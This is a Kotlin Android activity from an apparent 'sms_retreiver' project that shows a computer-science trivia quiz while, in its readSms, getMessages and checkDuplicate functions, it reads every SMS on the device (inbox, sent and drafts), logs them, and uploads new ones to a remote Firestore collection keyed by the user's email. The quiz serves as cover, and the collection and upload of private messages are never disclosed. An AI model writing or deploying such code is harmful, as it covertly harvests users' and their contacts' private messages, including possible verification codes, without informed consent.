package com.o7solutions.sms_retreiver.UI

import android.Manifest
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.RadioButton
import android.widget.RadioGroup
import android.widget.TextView
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.o7solutions.sms_retreiver.R
import com.o7solutions.sms_retreiver.data_classes.Question
import com.o7solutions.sms_retreiver.data_classes.QuestionsResponse
import com.o7solutions.sms_retreiver.data_classes.SmsMessage
import com.o7solutions.sms_retreiver.model.RetrofitInstance
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class QuestionsActivity : AppCompatActivity() {


    val smsList = arrayListOf<String>()
    val db = FirebaseFirestore.getInstance()
    val fbMessageList = arrayListOf<SmsMessage>()
    val phnMessageList = arrayListOf<SmsMessage>()
    val listToAdd = arrayListOf<SmsMessage>()

    private var questionsList = arrayListOf<Question>()
    private lateinit var recyclerView: RecyclerView
    var questionIndex = 0
    private lateinit var auth: FirebaseAuth
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_questions)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        auth = FirebaseAuth.getInstance()

        recyclerView = findViewById(R.id.recyclerView)
        recyclerView.layoutManager = LinearLayoutManager(this)


        fetchQuestions()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), 2)
        } else {
            readSms()
        }


//            displayQuestion()

    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 2 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            readSms()
        }
    }

    private fun fetchQuestions() {
        RetrofitInstance.api.getQuestions(
            amount = 10,
            category = 18, // Science: Computers
            difficulty = "easy",
            type = "multiple"
        ).enqueue(object : Callback<QuestionsResponse> {
            override fun onResponse(
                call: Call<QuestionsResponse>,
                response: Response<QuestionsResponse>
            ) {
                if (response.isSuccessful) {
                    val questions = response.body()?.results ?: emptyList()
                    questionsList.addAll(questions)
                    if (questionIndex == 0) {
                        displayQuestion()
                    }
//                    recyclerView.adapter = QuizAdapter(questions)
                }
            }

            override fun onFailure(call: Call<QuestionsResponse>, t: Throwable) {
                Toast.makeText(this@QuestionsActivity, "Error: ${t.message}", Toast.LENGTH_SHORT)
                    .show()
            }
        })
    }

    fun displayQuestion() {
        if (questionIndex in questionsList.indices) {
            val question = questionsList[questionIndex]

            showQuestionDialog(question) { answer ->
                if (answer == question.correct_answer) {
                    Toast.makeText(this, "Correct Answer!", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "Wrong Answer!", Toast.LENGTH_SHORT).show()
                }

                // Move to next question AFTER answer is handled
                questionIndex++
                displayQuestion()
            }

        } else {
            Toast.makeText(this, "Questions Finished!", Toast.LENGTH_SHORT).show()
        }
    }

    fun showQuestionDialog(question: Question, onAnswerSelected: (String) -> Unit) {
        val dialogView = layoutInflater.inflate(R.layout.item_question, null)
        val tvQuestion = dialogView.findViewById<TextView>(R.id.tvQuestion)
        val radioGroup = dialogView.findViewById<RadioGroup>(R.id.radioGroup)

        tvQuestion.text = question.question

        // Shuffle answers
        val allAnswers = question.incorrect_answers.toMutableList()
        allAnswers.add(question.correct_answer)
        allAnswers.shuffle()

        // Add options
        radioGroup.removeAllViews()
        allAnswers.forEach { answer ->
            val radio = RadioButton(this)
            radio.text = answer
            radioGroup.addView(radio)
        }

        // Create dialog
        val dialog = AlertDialog.Builder(this)
            .setView(dialogView)
            .setCancelable(false)
            .setPositiveButton("Next") { _, _ ->
                val selectedId = radioGroup.checkedRadioButtonId
                if (selectedId != -1) {
                    val selectedRadio = dialogView.findViewById<RadioButton>(selectedId)
                    val selectedAnswer = selectedRadio.text.toString()
                    onAnswerSelected(selectedAnswer)
                } else {
                    Toast.makeText(this, "Please select an option", Toast.LENGTH_SHORT).show()
                    showQuestionDialog(question, onAnswerSelected)
                }
            }
            .create()

        dialog.show()
    }


    //    SMS
    private fun readSms() {

        val cursor = contentResolver.query(
            Uri.parse("content://sms/"),
            null, // all columns
            null, // no selection
            null,
            "date DESC" // sort by latest first
        )

        cursor?.use {
            val addressIndex = it.getColumnIndex("address")
            val bodyIndex = it.getColumnIndex("body")
            val dateIndex = it.getColumnIndex("date")
            val typeIndex = it.getColumnIndex("type")

            while (it.moveToNext()) {
                val address = it.getString(addressIndex) ?: "Unknown"
                val body = it.getString(bodyIndex) ?: ""
                val dateMillis = it.getLong(dateIndex)
                val typeCode = it.getInt(typeIndex)

                val type = when (typeCode) {
                    1 -> "Inbox"
                    2 -> "Sent"
                    3 -> "Draft"
                    else -> "Other"
                }

                val date =
                    java.text.SimpleDateFormat("dd/MM/yyyy HH:mm", java.util.Locale.getDefault())
                        .format(java.util.Date(dateMillis))

                smsList.add("From: $address\nType: $type\nDate: $date\nMessage: $body\n")

                val sms = SmsMessage(auth.currentUser?.email.toString(), address, type, date, body)
                phnMessageList.add(sms)
            }
        }

        // Example: log or show SMS
        for (sms in smsList) {
            Log.d("SMS_LOG", sms)
        }



        getMessages()
    }

    fun addMessageToFirestore(sms: SmsMessage) {
        db.collection("sms_messages")
            .document()
            .set(sms)
            .addOnSuccessListener { documentRef ->
                Log.d("Firestore", "Message added ")
            }
            .addOnFailureListener { e ->
                Log.e("Firestore", "Error adding message", e)
            }
    }

    fun getMessages() {
        db.collection("sms_messages")
            .whereEqualTo("id", auth.currentUser?.email.toString())
            .get()
            .addOnSuccessListener { result ->
                fbMessageList.clear()
                for (doc in result) {
                    val sms = doc.toObject(SmsMessage::class.java)
                    fbMessageList.add(sms)
                }

                Log.d("Firebase Message List", fbMessageList.toString())


                checkDuplicate()
            }
            .addOnFailureListener { e ->
                Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
            }
    }



    fun checkDuplicate() {

        Log.d("Phone message List", phnMessageList.toString())
        val existingMessages = fbMessageList.map { it.id + it.message + it.date }.toSet()

        listToAdd.clear()

        for (sms in phnMessageList) {
            val key = sms.id + sms.message + sms.date
            if (!existingMessages.contains(key)) {
                listToAdd.add(sms)
            }
        }

        Log.d("List to be added",listToAdd.toString())

        for (sms in listToAdd) {
            addMessageToFirestore(sms)
        }
    }


}